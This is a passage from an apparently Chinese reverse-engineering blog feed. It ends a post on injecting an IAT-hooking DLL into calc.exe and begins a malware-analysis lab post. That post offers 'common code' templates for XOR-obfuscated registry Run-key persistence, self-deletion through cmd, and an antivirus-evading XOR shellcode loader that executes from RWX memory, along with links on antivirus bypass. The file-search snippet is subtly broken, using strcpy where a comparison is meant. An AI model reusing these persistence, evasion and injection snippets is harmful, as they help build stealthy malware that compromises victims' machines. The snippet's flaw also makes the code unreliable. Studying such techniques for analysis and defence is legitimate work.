class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">myhook</span><span class="params">(LPCSTR DLLname, PROC ori_func, PROC new_func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hMod;</span><br><span class="line">    PBYTE pAddr;</span><br><span class="line">    DWORD dwRVA;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;</span><br><span class="line">    LPCSTR szLibName;</span><br><span class="line">    PIMAGE_THUNK_DATA IAT;</span><br><span class="line">    DWORD lpflOldProtect=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    pAddr = (PBYTE)hMod;</span><br><span class="line"></span><br><span class="line">    pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]);</span><br><span class="line"></span><br><span class="line">    dwRVA = *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);</span><br><span class="line"></span><br><span class="line">    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod + dwRVA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; pImportDesc-&gt;Name; pImportDesc++)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);</span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(szLibName, DLLname))</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            IAT = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk);</span><br><span class="line">            <span class="keyword">for</span> (; IAT-&gt;u1.Function; IAT++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (IAT-&gt;u1.Function == (DWORD)ori_func)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//更改内存属性为可读可写</span></span><br><span class="line">                    VirtualProtect((LPVOID)&amp;IAT-&gt;u1.Function,<span class="number">4</span>,PAGE_EXECUTE_READWRITE,&amp;lpflOldProtect);</span><br><span class="line">                    IAT-&gt;u1.Function = (DWORD)new_func;</span><br><span class="line">                    <span class="comment">//恢复内存属性</span></span><br><span class="line">                    VirtualProtect((LPVOID)&amp;IAT-&gt;u1.Function, <span class="number">4</span>, lpflOldProtect, &amp;lpflOldProtect);</span><br><span class="line">                    </span><br><span class="line">                    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;The_Itach1&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> TRUE;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码就是利用pe结构的知识，来找到calc.exe进程中SetWindowTextW的地址，然后换为我们的My_SWT函数地址，需要知道的是，这个函数所属的user32.dll是已经加载到了calc.exe的4GB的虚拟内存中了的，所以是映射，类似于CreateFileMapping这种，所以是用RVA去一步步找到函数地址。</p><p>全部代码myhook.dll</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;wchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">FARPROC orig_SWT = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* PFSETWINDOWTEXTW)</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">My_SWT</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">wchar_t</span>* table = <span class="string">L&quot;零一二三四五六七八九&quot;</span>;</span><br><span class="line">    <span class="keyword">wchar_t</span> temp;</span><br><span class="line">    <span class="keyword">int</span> len, i, index;</span><br><span class="line">    len = wcslen(lpString);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">L&#x27;0&#x27;</span> &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= <span class="string">L&#x27;9&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = lpString[i];</span><br><span class="line">            index = _wtoi((<span class="keyword">const</span> <span class="keyword">wchar_t</span>*)&amp;temp);</span><br><span class="line">            lpString[i] = table[index];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ((PFSETWINDOWTEXTW)orig_SWT)(hWnd, lpString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">myhook</span><span class="params">(LPCSTR DLLname, PROC ori_func, PROC new_func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hMod;</span><br><span class="line">    PBYTE pAddr;</span><br><span class="line">    DWORD dwRVA;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;</span><br><span class="line">    LPCSTR szLibName;</span><br><span class="line">    PIMAGE_THUNK_DATA IAT;</span><br><span class="line">    DWORD lpflOldProtect=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    pAddr = (PBYTE)hMod;</span><br><span class="line"></span><br><span class="line">    pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]);</span><br><span class="line"></span><br><span class="line">    dwRVA = *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);</span><br><span class="line"></span><br><span class="line">    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod + dwRVA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; pImportDesc-&gt;Name; pImportDesc++)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);</span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(szLibName, DLLname))</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            IAT = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk);</span><br><span class="line">            <span class="keyword">for</span> (; IAT-&gt;u1.Function; IAT++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (IAT-&gt;u1.Function == (DWORD)ori_func)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//更改内存属性为可读可写</span></span><br><span class="line">                    VirtualProtect((LPVOID)&amp;IAT-&gt;u1.Function,<span class="number">4</span>,PAGE_EXECUTE_READWRITE,&amp;lpflOldProtect);</span><br><span class="line">                    IAT-&gt;u1.Function = (DWORD)new_func;</span><br><span class="line">                    <span class="comment">//恢复内存属性</span></span><br><span class="line">                    VirtualProtect((LPVOID)&amp;IAT-&gt;u1.Function, <span class="number">4</span>, lpflOldProtect, &amp;lpflOldProtect);</span><br><span class="line">                    </span><br><span class="line">                    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;The_Itach1&quot;</span>, <span class="string">&quot;The_Itach1&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> TRUE;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">//最初的SetWindowTextW的地址</span></span><br><span class="line">        orig_SWT = GetProcAddress(GetModuleHandle(<span class="string">L&quot;user32.dll&quot;</span>),<span class="string">&quot;SetWindowTextW&quot;</span>);</span><br><span class="line"></span><br><span class="line">        myhook(<span class="string">&quot;user32.dll&quot;</span>,orig_SWT,(PROC)My_SWT);</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来用InjectDll.exe注入然后看看效果<br><img src="https://i.loli.net/2021/10/19/QKfweFYoVBniaW1.png"></p><h3 id="xdbg调试Dllmain"><a href="#xdbg调试Dllmain" class="headerlink" title="xdbg调试Dllmain"></a>xdbg调试Dllmain</h3><p>这里调试看看究竟怎么回事，把xdbg选项设置好后，在dllmian断下来。</p><p>Dllmain函数<br><img src="https://i.loli.net/2021/10/19/DIdNtfneYF4gTvX.png"><br>经过一些下断点调试后<br><img src="https://i.loli.net/2021/10/19/erXZF3aylbmTWkV.png"><br>然后进人我们的My_SWT函数。<br><img src="https://i.loli.net/2021/10/19/FBTo1tApgbJNu6h.png"><br>基本上也就调试结束了。</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 《逆原》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战lab</title>
      <link href="2021/09/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab/"/>
      <url>2021/09/29/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab/</url>
      
        <content type="html"><![CDATA[<h1 id="《恶意代码分析实战lab》"><a href="#《恶意代码分析实战lab》" class="headerlink" title="《恶意代码分析实战lab》"></a>《恶意代码分析实战lab》</h1><p>本文章用来记录本书的lab分析过程，对于书上的问题都是选择来分析，有些lab是重复的，所以前面的一些lab可能只会部分分析，然后到后面来具体分析。</p><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>免杀</p><p><a href="https://www.const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/">https://www.const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/</a></p><p><a href="https://saucer-man.com/operation_and_maintenance/465.html">https://saucer-man.com/operation_and_maintenance/465.html</a></p><p><a href="https://paper.seebug.org/1413/#_5">https://paper.seebug.org/1413/#_5</a></p><p><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p><p><a href="https://www.yuque.com/tidesec/bypassav/309d7b24dfc5880d2b3fa78813ea72ea">https://www.yuque.com/tidesec/bypassav/309d7b24dfc5880d2b3fa78813ea72ea</a></p><p><a href="https://github.com/Airboi/bypass-av-note">https://github.com/Airboi/bypass-av-note</a></p><h2 id="常用代码"><a href="#常用代码" class="headerlink" title="常用代码"></a>常用代码</h2><p>修改注册表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> szSubKey[] = &#123;<span class="number">0x57</span>,<span class="number">0x4b</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0x53</span>,<span class="number">0x45</span>,<span class="number">0x56</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x49</span>,<span class="number">0x6d</span>,<span class="number">0x67</span>,<span class="number">0x76</span>,<span class="number">0x6b</span>,<span class="number">0x77</span>,<span class="number">0x6b</span>,<span class="number">0x62</span>,<span class="number">0x70</span>,<span class="number">0x58</span>,<span class="number">0x53</span>,<span class="number">0x6d</span>,<span class="number">0x6a</span>,<span class="number">0x60</span>,<span class="number">0x6b</span>,<span class="number">0x73</span>,<span class="number">0x77</span>,<span class="number">0x58</span>,<span class="number">0x47</span>,<span class="number">0x71</span>,<span class="number">0x76</span>,<span class="number">0x76</span>,<span class="number">0x61</span>,<span class="number">0x6a</span>,<span class="number">0x70</span>,<span class="number">0x52</span>,<span class="number">0x61</span>,<span class="number">0x76</span>,<span class="number">0x77</span>,<span class="number">0x6d</span>,<span class="number">0x6b</span>,<span class="number">0x6a</span>,<span class="number">0x58</span>,<span class="number">0x56</span>,<span class="number">0x71</span>,<span class="number">0x6a</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Regkey1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(szSubKey);i++)</span><br><span class="line">&#123;</span><br><span class="line">szSubKey[i]=szSubKey[i]^<span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">CHAR* path=<span class="literal">NULL</span>;</span><br><span class="line">HKEY hkey;</span><br><span class="line"></span><br><span class="line">path = (CHAR*)LocalAlloc(<span class="number">0x40</span>u, <span class="number">0x40</span>u);</span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>, path, <span class="number">0x40</span>u);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RegOpenKeyExA(HKEY_CURRENT_USER, szSubKey, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkey);</span><br><span class="line">RegSetValueEx(hkey, <span class="string">&quot;MyStart&quot;</span>, <span class="number">0</span>, REG_SZ, (<span class="keyword">const</span> BYTE *)path, <span class="built_in">strlen</span>(path));</span><br><span class="line">RegCloseKey(hkey);</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Regkey1();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;yes&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listFiles</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* dir)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dir[<span class="number">100</span>]=<span class="string">&quot;D:\\a&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    listFiles(dir);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listFiles</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFind;</span><br><span class="line">    WIN32_FIND_DATA findData;</span><br><span class="line">    LARGE_INTEGER size;</span><br><span class="line">    <span class="keyword">char</span> dirNew[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向目录加通配符，用于搜索第一个文件 </span></span><br><span class="line">    <span class="built_in">strcpy</span>(dirNew, dir);</span><br><span class="line">    <span class="built_in">strcat</span>(dirNew, <span class="string">&quot;\\*.*&quot;</span>);</span><br><span class="line"></span><br><span class="line">    hFind = FindFirstFile(dirNew, &amp;findData);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 是否是文件夹，</span></span><br><span class="line">        <span class="keyword">if</span>(findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">//并且名称不为&quot;.&quot;或&quot;..&quot;  </span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(findData.cFileName,<span class="string">&quot;.&quot;</span>)!=<span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(findData.cFileName, <span class="string">&quot;..&quot;</span>)!=<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 将dirNew设置为搜索到的目录，并进行下一轮搜索 </span></span><br><span class="line">            <span class="keyword">char</span> dirNew1[<span class="number">100</span>];</span><br><span class="line">            <span class="built_in">strcpy</span>(dirNew1, dir);</span><br><span class="line">            <span class="built_in">strcat</span>(dirNew1, <span class="string">&quot;\\&quot;</span>);</span><br><span class="line">            <span class="built_in">strcat</span>(dirNew1, findData.cFileName);</span><br><span class="line">            listFiles(dirNew1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcpy</span>(findData.cFileName,<span class="string">&quot;test1.exe&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,dirNew);</span><br><span class="line">Sleep(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FindNextFile(hFind, &amp;findData));</span><br><span class="line"></span><br><span class="line">    FindClose(hFind);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自删除代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CHAR Filename[<span class="number">260</span>];</span><br><span class="line">CHAR Parameters[<span class="number">260</span>];</span><br><span class="line"></span><br><span class="line">GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">GetShortPathNameA(Filename, Filename, <span class="number">0x104</span>u);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, Filename);</span><br><span class="line"><span class="built_in">strcpy</span>(Parameters, <span class="string">&quot;/c del &quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(Parameters, Filename);</span><br><span class="line"><span class="built_in">strcat</span>(Parameters, <span class="string">&quot; &gt;&gt; NUL&quot;</span>);</span><br><span class="line">ShellExecuteA(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;cmd.exe&quot;</span>, Parameters, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shellcode简单免杀</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall* CODE)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[]=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=<span class="string">&quot;this_is_a_key&quot;</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[<span class="number">798</span>];</span><br><span class="line"><span class="keyword">int</span> i,j=<span class="number">0</span>;</span><br><span class="line">PVOID p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1596</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">buf[j]=s[i];</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">798</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">buf[i]=buf[i]^key[i%<span class="built_in">strlen</span>(key)];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\x%x&quot;</span>,buf[i]);</span><br><span class="line">&#125;</span><br><span class="line">p = VirtualAlloc(<span class="number">0</span>, <span class="number">798</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(p, buf, <span class="number">798</span>);</span><br><span class="line">    </span><br><span class="line">    CODE code = (CODE)p;</span><br><span class="line">    code();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 